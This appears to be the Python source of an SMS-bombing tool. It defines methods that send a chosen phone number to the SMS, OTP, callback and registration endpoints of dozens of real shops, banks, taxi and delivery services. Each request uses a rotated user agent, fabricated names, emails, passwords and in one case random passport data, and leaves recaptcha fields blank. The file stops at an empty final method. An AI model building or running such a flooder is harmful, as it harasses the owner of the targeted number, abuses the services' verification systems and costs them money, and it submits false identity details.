import asyncio, json
from bs4 import BeautifulSoup as bs
from random import randint
from data import *
from queries import *

data_headers={"X-Requested-With": "XMLHttpRequest",
"Connection": "keep-alive",
"Pragma": "no-cache",
"Cache-Control": "no-cache",
"Accept-Encoding": "gzip, deflate, br",
'User-Agent':user_agent(), 'DNT':'1'}

def phone_mask(phone, maska):
    str_list = list(phone)
    for xxx in str_list:
        maska=maska.replace("#", xxx, 1)
    return maska

class Service():
    def __init__(self):
        self.start = True

    def number(self, number_phone):
        self.phone = number_phone
        if self.phone[0] == '+':
            self.phone_not_pluse = str(number_phone[1:])
            self.phone_mask = str(phone_mask(phone=self.phone_not_pluse, maska="+# (###) ###-##-##"))

            if self.phone[1] == '3':
                self.country_code = '380'

            elif self.phone[1] == '7':
                self.country_code = '7'

            elif self.phone[1] == '8':
                self.country_code = '7'

            elif self.phone[1] == '9':
                self.country_code = '998'

            else:
                self.country_code = str(self.phone[1])+str(self.phone[2])

        elif isinstance(int(self.phone), int):
            self.phone_not_pluse = str(number_phone)
            self.phone_mask = str(phone_mask(phone=number_phone, maska="+# (###) ###-##-##"))

            if self.phone[0] == '3':
                self.country_code = '380'

            elif self.phone[0] == '7':
                self.country_code = '7'

            elif self.phone[1] == '8':
                self.country_code = '7'

            elif self.phone[0] == '9':
                self.country_code = '998'

            else:
                self.country_code = str(self.phone[0])+str(self.phone[1])
            self.phone = '+'+str(number_phone)

    def benzuber(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url("https://app.benzuber.ru/login", data={"phone":self.phone},headers=headers_copy))

    def cinema5(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://cinema5.ru/api/phone_code",
            data={"phone": self.phone}, headers=headers_copy))

    def citilink(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            f"https://www.citilink.ru/registration/confirm/phone/+{self.phone_not_pluse}/",headers=headers_copy))

    def city24(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://city24.ua/personalaccount/account/registration",
            data={"PhoneNumber": self.phone_not_pluse},headers=headers_copy))

    def studio(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        password = password()
        asyncio.run(post_data_url(
            "https://cross-studio.ru/ajax/lk/send_sms",
            data={
                "phone": self.phone_mask,
                "email": email(),
                "pass": password,
                "pass1": password,
                "name": username(),
                "fename": username(),
                "hash": "",
            },headers=headers_copy))

    def dianet(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://my.dianet.com.ua/send_sms/", data={"phone": self.phone}, headers=headers_copy))

    def dns_shop(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://www.dns-shop.ru/order/order-single-page/check-and-initiate-phone-confirmation/",
            params={"phone": self.phone, "is_repeat": 0, "order_guid": 1},headers=headers_copy))

    def eldorado(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(get_data_url(
            "https://api.eldorado.ua/v1/sign/",
            params={
                "login": self.phone,
                "step": "phone-check",
                "fb_id": "null",
                "fb_token": "null",
                "lang": "ru"
            },headers=headers_copy))

    def finam(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://www.finam.ru/api/smslocker/sendcode",
            data={"phone": self.phone},headers=headers_copy))

    def dgtl(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://i-dgtl.ru/curl/flashcall.php",
            data={
                "check": "",
                "flashcall-code": randint(1000, 9999),
                "flashcall-tel": self.phone,
            },headers=headers_copy))
        asyncio.run(post_data_url(
            "https://i-dgtl.ru/curl/sms.php",
            data={"check": "", "flashcall-tel": self.phone},headers=headers_copy))

    def flipkart(self):
        agent = user_agent()
        asyncio.run(post_data_url(
            "https://www.flipkart.com/api/5/user/otp/generate",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": agent,
            },
            data={"loginId": self.phone}
        ))

        asyncio.run(post_data_url(
            "https://www.flipkart.com/api/6/user/signup/status",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": agent,
            },
            json={"loginId": self.phone, "supportAllStates": True}))

    def foodband(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://foodband.ru/api?call=calls",
            data={
                "customerName": _ru_name_(),
                "phone": self.phone_mask,
                "g-recaptcha-response": "",
            },headers=headers_copy))

        asyncio.run(get_data_url(
            "https://foodband.ru/api/",
            params={
                "call": "customers/sendVerificationCode",
                "phone": self.phone,
                "g-recaptcha-response": "",
            },headers=headers_copy))

    def gazprom(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://www.gazprombank.ru/rest/sms.send",
            json={
                "phone": self.phone_mask,
                "type": "debit_card",
            },headers=headers_copy))

    def getmancar(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://crm.getmancar.com.ua/api/veryfyaccount",
            json={
                "phone": "+" + self.phone,
                "grant_type": "password",
                "client_id": "gcarAppMob",
                "client_secret": "SomeRandomCharsAndNumbersMobile",
            },headers=headers_copy))

    def ginzadelivery(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://ginzadelivery.ru/v1/auth", json={"phone": self.phone},headers=headers_copy))

    def grinica(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://grilnica.ru/loginphone/",
            data={
                "step": 0,
                "phone": phone_mask(self.phone_not_pluse, "+# (###) ###-####"),
                "code": "",
                "allow_sms": "on",
                "apply_offer": "on",
            },headers=headers_copy))

    def gurutaxi(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://guru.taxi/api/v1/driver/session/verify",
            json={"phone": {"code": 1, "number": self.phone}},headers=headers_copy))

    def hatimaki(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://www.hatimaki.ru/register/",
            data={
                "REGISTER[LOGIN]": self.phone,
                "REGISTER[PERSONAL_PHONE]": self.phone,
                "REGISTER[SMS_CODE]": "",
                "resend-sms": "1",
                "REGISTER[EMAIL]": "",
                "register_submit_button": "Зарегистрироваться",
            },headers=headers_copy))

    def helsi(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://helsi.me/api/healthy/accounts/login",
            json={"phone": self.phone, "platform": "PISWeb"},headers=headers_copy))

    def hmara(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(get_data_url(
            "https://api.hmara.tv/stable/entrance",
            params={"contact": self.phone},headers=headers_copy))

    def icq(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://www.icq.com/smsreg/requestPhoneValidation.php",
            data={
                "msisdn": self.phone,
                "locale": "en",
                "countryCode": "ru",
                "version": "1",
                "k": "ic1rtwz1s1Hj1O0r",
                "r": "46763",
            },headers=headers_copy))

    def ievaphone(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(get_data_url(
            "https://ievaphone.com/call-my-phone/web/request-free-call",
            params={
                "phone": self.phone,
                "domain": "IEVAPHONE",
                "browser": "undefined",
            },headers=headers_copy))

    def imgur(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://api.imgur.com/account/v1/phones/verify",
            json={"phone_number": self.phone, "region_code": "RU"},headers=headers_copy))

    def indriver(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://terra-1.indriverapp.com/api/authorization?locale=ru",
            data={
                "mode": "request",
                "phone": self.phone,
                "phone_permission": "unknown",
                "stream_id": 0,
                "v": 3,
                "appversion": "3.20.6",
                "osversion": "unknown",
                "devicemodel": "unknown",
            },headers=headers_copy))

    def ingos(self):
        asyncio.run(post_data_url(
            "https://www.ingos.ru/api/v1/lk/auth/register/fast/step2",
            headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal",'User-Agent':user_agent(), 'DNT':'1'},
            json={
                "Birthday": "1986-07-10T07:19:56.276+02:00",
                "DocIssueDate": "2004-02-05T07:19:56.276+02:00",
                "DocNumber": randint(500000, 999999),
                "DocSeries": randint(5000, 9999),
                "FirstName": _ru_name_(),
                "Gender": "M",
                "LastName": _ru_name_(),
                "SecondName": _ru_name_(),
                "Phone": self.phone,
                "Email": email(),
            }))

    def invitro(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
            data={
                "password": password(),
                "application": "lkp",
                "login": self.phone,
            },headers=headers_copy))

    def iqlab(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://iqlab.com.ua/session/ajaxregister",
            data={
                "cellphone": self.phone_mask,
            },headers=headers_copy))

    def ivi(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://api.ivi.ru/mobileapi/user/register/phone/v6",
            data={"phone": self.phone},headers=headers_copy))

    def iwant(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://i-want.ru/api/auth/v1/customer/login/phone",
            json={"phone": self.phone},headers=headers_copy))

    def izi(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://izi.ua/api/auth/register",
            json={
                "phone": "+" + self.phone,
                "name": _ru_name_(),
                "is_terms_accepted": True,
            },headers=headers_copy))

        asyncio.run(post_data_url(
            "https://izi.ua/api/auth/sms-login",
            json={"phone": "+" + self.phone},headers=headers_copy))

    def kant(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://www.kant.ru/ajax/profile/send_authcode.php",
            data={"Phone": self.phone},headers=headers_copy))

    def karusel(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://app.karusel.ru/api/v1/phone/", data={"phone": self.phone},headers=headers_copy))

    def kaspi(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://kaspi.kz/util/send-app-link", data={"address": self.phone},headers=headers_copy))

    def kfc(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
            json={"phone": self.phone}, headers=headers_copy))

    def kilovkusa(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://kilovkusa.ru/ajax.php",
            params={
                "block": "auth",
                "action": "send_register_sms_code",
                "data_type": "json",
            },
            data={"phone": f"{self.phone_mask}"},headers=headers_copy))

    def kinolab(self):
        asyncio.run(post_data_url(
            "https://api.kinoland.com.ua/api/v1/service/send-sms",
            headers={"Agent": "website"},
            json={"Phone": self.phone, "Type": 1}))

    def koronapay(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://koronapay.com/transfers/online/api/users/otps",
            data={"phone": self.phone},headers=headers_copy))

    def krista(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://kristalnaya.ru/ajax/ajax.php?action=send_one_pas_reg",
            data={"phone":self.phone_mask}, headers=headers_copy))

    def kvivstart(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://cas-api.kyivstar.ua/api/sendSms",
            data={"lang": "uk", "msisdn": self.phone},headers=headers_copy))

    def lenta(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://lenta.com/api/v1/authentication/requestValidationCode",
            json={"phone": self.phone},headers=headers_copy))

    def levin(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://rubeacon.com/api/app/5ea871260046315837c8b6f3/middle",
            json={
                "url": "/api/client/phone_verification",
                "method": "POST",
                "data": {
                    "client_id": 5646981,
                    "phone": self.phone,
                    "alisa_id": 1,
                },
                "headers": {
                    "Client-Id": 5646981,
                    "Content-Type": "application/x-www-form-urlencoded",
                },
            },headers=headers_copy))

    def limetaxi(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "http://212.22.223.149:7200/api/account/register/sendConfirmCode",
            json={"phone": self.phone},headers=headers_copy))

    def loany(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://loany.com.ua/funct/ajax/registration/code",
            data={"phone": self.phone},headers=headers_copy))

    def logistic(self):
        asyncio.run(post_data_url(
            "https://api-rest.logistictech.ru/api/v1.1/clients/request-code",
            json={"phone": self.phone},
            headers={"Restaurant-chain": "c0ab3d88-fba8-47aa-b08d-c7598a3be0b9", 'User-Agent':user_agent()}))

    def makarolls(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php",
            data={"data": self.phone, "metod": "postreg"},headers=headers_copy))

    def makimaki(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(get_data_url(
            "https://makimaki.ru/system/callback.php",
            params={
                "cb_fio": _ru_name_(),
                "cb_phone": phone_mask(self.phone_not_pluse, "+# ### ### ## ##")
            },headers=headers_copy))

    def menuau(self):
        password = password()
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://www.menu.ua/kiev/delivery/registration/direct-registration.html",
            data={
                "user_info[fullname]": _ru_name_(),
                "user_info[phone]": self.phone,
                "user_info[email]": email(),
                "user_info[password]": password,
                "user_info[conf_password]": password,
            }))
        asyncio.run(post_data_url(
            "https://www.menu.ua/kiev/delivery/profile/show-verify.html",
            data={"phone": self.phone, "do": "phone"},headers=headers_copy))

    def menzacafe(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(get_data_url(
            "https://menza-cafe.ru/system/call_me.php",
            params={
                "fio": _ru_name_(),
                "phone": self.phone,
                "phone_number": "1",
            }))

    def mistercash(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(get_data_url(
            "https://my.mistercash.ua/ru/send/sms/registration",
            params={"number": self.phone},headers=headers_copy))

    def mngogomenu(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(get_data_url(f"http://mnogomenu.ru/office/password/reset/{self.phone_mask}",headers=headers_copy))
        asyncio.run(post_data_url('http://mnogomenu.ru/ajax/callback/send', data={f'uname':{name()},'uphone':f'{phone_mask(phone=self.phone_not_pluse, maska="+#(###)+###+##+##")}'},
        headers=headers_copy))

    def mobileplanet(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://mobileplanet.ua/register",
            data={
                "klient_name": username(),
                "klient_phone": self.phone,
                "klient_email": email(),
            },headers=headers_copy))

    def modulbank(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://my.modulbank.ru/api/v2/registration/nameAndPhone",
            json={
                "FirstName": _ru_name_(),
                "CellPhone": self.phone,
                "Package": "optimal",
            },headers=headers_copy))

    def molbulak(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://www.molbulak.ru/ajax/smsservice.php",
            data={"command": "send_code_loan", "phone": self.phone},headers=headers_copy))

    def moneymanu(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://moneyman.ru/registration_api/actions/send-confirmation-code",
            data=self.phone,headers=headers_copy))

    def monobank(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://www.monobank.com.ua/api/mobapplink/send",
            data={"phone": self.phone},headers=headers_copy))

    def mospizza(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php",
            data={"name": _ru_name_(), "phone": self.phone}, headers=headers_copy))

    def moyo(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://www.moyo.ua/identity/registration",
            data={
                "firstname": name(),
                "phone": self.phone,
                "email": email()
            },headers=headers_copy))

    def mtstv(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",
            params={"msisdn": self.phone},headers=headers_copy))

    def multiplex(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://auth.multiplex.ua/login", json={"login": self.phone},headers=headers_copy))

    def mygames(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://account.my.games/signup_send_sms/",
            data={"phone": self.phone},headers=headers_copy))

    def niyama(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://www.niyama.ru/ajax/sendSMS.php",
            data={
                "REGISTER[PERSONAL_PHONE]": self.phone,
                "code": "",
                "sendsms": "Выслать код",
            }))

    def nl(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://www.nl.ua",
            data={
                "component": "bxmaker.authuserphone.login",
                "sessid": "bf70db951f54b837748f69b75a61deb4",
                "method": "sendCode",
                "phone": self.phone,
                "registration": "N",
            },headers=headers_copy))

    def nncard(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://nn-card.ru/api/1.0/register",
            json={"phone": self.phone, "password": password()},headers=headers_copy))

    def nova(self):
        name = "".join(random.choices("Іїє", k=random.randint(3, 5)))
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://api.novaposhta.ua/v2.0/json/LoyaltyUserGeneral/registration",
            json={
                "modelName": "LoyaltyUserGeneral",
                "calledMethod": "registration",
                "system": "PA 3.0",
                "methodProperties": {
                    "City": "8d5a980d-391c-11dd-90d9-001a92567626",
                    "FirstName": name,
                    "LastName": name,
                    "Patronymic": name,
                    "Phone": f"{self.phone}",
                    "Email": email(),
                    "BirthDate": "06.06.2010",
                    "Password": "0c465655c53d2d8ec971581f5dfdbd83",
                    "Gender": "M",
                    "CounterpartyType": "PrivatePerson",
                    "MarketplacePartnerToken": "005056887b8d-b5da-11e6-9f54-cea38574",
                },
            },headers=headers_copy))

    def ok(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
            data={"st.r.phone": self.phone},headers=headers_copy))

    def okean(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(get_data_url(
            "https://okeansushi.ru/includes/contact.php",
            params={
                "call_mail": "1",
                "ajax": "1",
                "name": _ru_name_(),
                "phone": self.phone,
                "call_time": "1",
                "pravila2": "on",
            },headers=headers_copy))

    def oldi(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://www.oldi.ru/ajax/reg.php",
            data={
                "method": "isUserPhone",
                "phone": self.phone_mask,
            },headers=headers_copy))

    def ollis(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://www.ollis.ru/gql",
            json={
                "query": 'mutation { phone(number:'+self.phone+', locale:ru) { token error { code message } } }'
            },headers=headers_copy))

    def onlineua(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(get_data_url(
            "https://secure.online.ua/ajax/check_phone/",
            params={"reg_phone": self.phone},headers=headers_copy))

    def osaka(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://www.osaka161.ru/local/tools/webstroy.webservice.php",
            data={
                "name": "Auth.SendPassword",
                "params[0]": self.phone_mask,
            },headers=headers_copy))

    def ozon(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",
            json={"phone": self.phone, "otpId": 0},headers=headers_copy))

    def panpizza(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode",
            data={"telephone": "8" + self.phone_not_pluse[1:]},headers=headers_copy))

    def pirogin(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://piroginomerodin.ru/index.php?route=sms/login/sendreg",
            data={"telephone": "+" + self.phone_not_pluse}, headers=headers_copy))

    def pizza46(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://pizza46.ru/ajaxGet.php",
            data={"phone": phone_mask(self.phone_not_pluse, "+# (###) ###-####")}, headers=headers_copy))

    def pizzakaz(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://pizzakazan.com/auth/ajax.php",
            data={"phone": "+" + self.phone_not_pluse, "method": "sendCode"},headers=headers_copy))

    def pizzasinizza(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://pizzasinizza.ru/api/phoneCode.php", json={"phone": self.phone},headers=headers_copy)
        )

    def planetak(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(get_data_url(
            "https://cabinet.planetakino.ua/service/sms",
            params={"phone": self.phone},headers=headers_copy))

    def pliskov(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",
            data={"phone": self.phone_mask},headers=headers_copy))

    def pomodoro(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://butovo.pizzapomodoro.ru/ajax/user/auth.php",
            data={
                "AUTH_ACTION": "SEND_USER_CODE",
                "phone": self.phone_mask,
            },headers=headers_copy))

    def privatebank(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://carddesign.privatbank.ua/phone",
            data={"phone": self.phone},headers=headers_copy))

    def prosushi(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://www.prosushi.ru/php/profile.php",
            data={"phone": self.phone, "mode": "sms"},headers=headers_copy)
        )

    def qbbox(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://qbbox.ru/api/user",
            json={"phone": self.phone, "account_type": 1},headers=headers_copy))

    def qlean(self):
        asyncio.run(post_data_url(
            "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
            json={"phone": self.phone}))

        asyncio.run(get_data_url(
            "https://sso.cloud.qlean.ru/http/users/requestotp",
            headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"},
            params={
                "phone": self.phone,
                "clientId": "undefined",
                "sessionId": str(randint(5000, 9999)),
            }))

    def raiffeisen(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(get_data_url(
            "https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code",
            params={"number": self.phone},headers=headers_copy))

    def rbt(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://www.rbt.ru/user/sendCode/",
            data={"phone": self.phone_mask}, headers=headers_copy))

    def rendesvouz(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://www.rendez-vous.ru/callback/create/",
            data={'input_for_spam':'Callback','name':name(),
            'phone':phone_mask(self.phone_not_pluse, "+#(###)###-##-##"),
            'ajax':'callback-form', 'yt2':'Отправить заявку'
            },headers=headers_copy))

    def sushiroll(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://sushirolla.ru/page/save.php",
            data={
                "send_me_password": 1,
                "phone": self.phone_mask,
            },headers=headers_copy))

    def richfamely(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url("https://region.richfamily.ru/ajax/sms_activities/sms_validate_phone.php",
            data={'phone':phone_mask(self.phone_not_pluse, '#-###-###-##-##'),
            'isAuth':'Y', 'sessid':'e3v9bp9aw4be3caeb4rd5ma2ea73e7d3'}, headers=headers_copy))

    def rieltor(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://rieltor.ua/api/users/register-sms/",
            json={"phone": self.phone, "retry": 0},headers=headers_copy))

    def rutaxi(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://rutaxi.ru/ajax_auth.html", data={"l": self.phone, "c": "3"},headers=headers_copy))

    def rutube(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://pass.rutube.ru/api/accounts/phone/send-password/",
            json={"phone": self.phone}, headers=headers_copy))

    def sayoris(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://sayoris.ru/?route=parse/whats",
            data={"phone": self.phone},headers=headers_copy))

    def sedi(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(get_data_url(
            "https://msk1.sedi.ru/webapi",
            params={
                "callback": "jQuery19107992940218113256_1595059640271",
                "q": "get_activation_key",
                "phone": self.phone_mask,
                "way": "bysms",
                "usertype": "customer",
                "lang": "ru-RU",
                "apikey": "EF96ADBE-2DFC-48F7-AF0A-69A007223039",
            },headers=headers_copy))

    def shafa(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://shafa.ua/api/v3/graphiql",
            json={
                "operationName": "RegistrationSendSms",
                "variables": {"phoneNumber": self.phone},
                "query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n",
            },headers=headers_copy))

        asyncio.run(post_data_url(
            "https://shafa.ua/api/v3/graphiql",
            json={
                "operationName": "sendResetPasswordSms",
                "variables": {"phoneNumber": self.phone},
                "query": "mutation sendResetPasswordSms($phoneNumber: String!) {\n  resetPasswordSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      ...errorsData\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment errorsData on GraphResponseError {\n  field\n  messages {\n    code\n    message\n    __typename\n  }\n  __typename\n}\n",
            },headers=headers_copy))

    def shopandshow(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://shopandshow.ru/sms/password-request/",
            data={"phone": self.phone, "resend": 0},headers=headers_copy))

    def signalis(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://deathstar.signal.is/auth",
            data={"phone": self.phone},headers=headers_copy))

    def sipnet(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper",
            params={"oper": 9, "callmode": 1, "phone": self.phone},headers=headers_copy))

    def smartspace(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://smart.space/api/users/request_confirmation_code/",
            json={"mobile": self.phone, "action": "confirm_mobile"},headers=headers_copy))

    def sms4(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",
            data={"demo_number": self.phone, "ajax_demo_send": "1"},headers=headers_copy))

    def sovest(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(get_data_url(
            "https://oauth.sovest.ru/oauth/authorize",
            data={
                "client_id": "dbo_web",
                "response_type": "urn:qiwi:oauth:response-type:confirmation-id",
                "username": self.phone,
                "recaptcha": "",
            },headers=headers_copy))

    def sportmasterua(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(get_data_url(
            "https://www.sportmaster.ua/",
            params={
                "module": "users",
                "action": "SendSMSReg",
                "phone": self.phone,
            },headers=headers_copy))


    def oyorooms(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
